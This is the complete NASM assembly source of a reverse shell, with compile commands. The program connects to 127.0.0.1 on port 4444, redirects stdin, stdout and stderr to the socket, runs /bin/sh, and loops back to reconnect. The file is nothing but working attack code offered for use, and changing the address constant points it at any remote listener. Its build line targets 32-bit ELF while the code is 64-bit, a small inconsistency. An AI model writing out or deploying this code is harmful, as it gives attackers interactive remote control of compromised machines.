; A simple reverse shell in nasm x86
; To compile :
; nasm -f elf rev.s -o rev.o
; ld rev.o -o rev

BITS 64

global _start

segment .bss ; uninitialized variable
      struc sockaddr
          sin_family: resw 1
          sin_port: resw 1
          sin_addr: resd 1
          sin_zero: resb 8
      endstruc

segment .rodata
      sockaddr_struct_init:
            istruc sockaddr
                at sin_family, dw 0x2
                at sin_port,   dw 0x5c11    ; 4444
                at sin_addr,   dd 0x100007f ; 127.0.0.1
                at sin_zero,   times 8 db 0
            iend
      binsh db "/bin/sh", 0
      binsh_len equ $-binsh
segment .text

_start:
      mov rax, 41
      mov rdi, 0x2 ; AF_INET
      mov rsi, 0x1 ; SOCK_STREAM
      mov rdx, 0x6 ; TCP
      syscall
      push rax
      jmp _connect_to_socket

_connect_to_socket:
      mov rax, 42
      pop rdi
      push rdi
      mov rsi, sockaddr_struct_init
      mov rdx, 0x10
      syscall
      jmp _duplicate_fd_stdin

_duplicate_fd_stdin:
      mov rax, 33
      pop rdi
      push rdi
      mov rsi, 0
      syscall
      jmp _duplicate_fd_stdout

_duplicate_fd_stdout:
      mov rax, 33
      pop rdi
      push rdi
      mov rsi, 1
      syscall
      jmp _duplicate_fd_stderr

_duplicate_fd_stderr:
      mov rax, 33
      pop rdi
      push rdi
      mov rsi, 2
      syscall
      jmp _spawn_shell

_spawn_shell:
      mov rax, 59
      mov rdi, binsh
      xor rsi, rsi
      xor rdx, rdx
      syscall
      jmp _persist

_persist:
      jmp _start
      
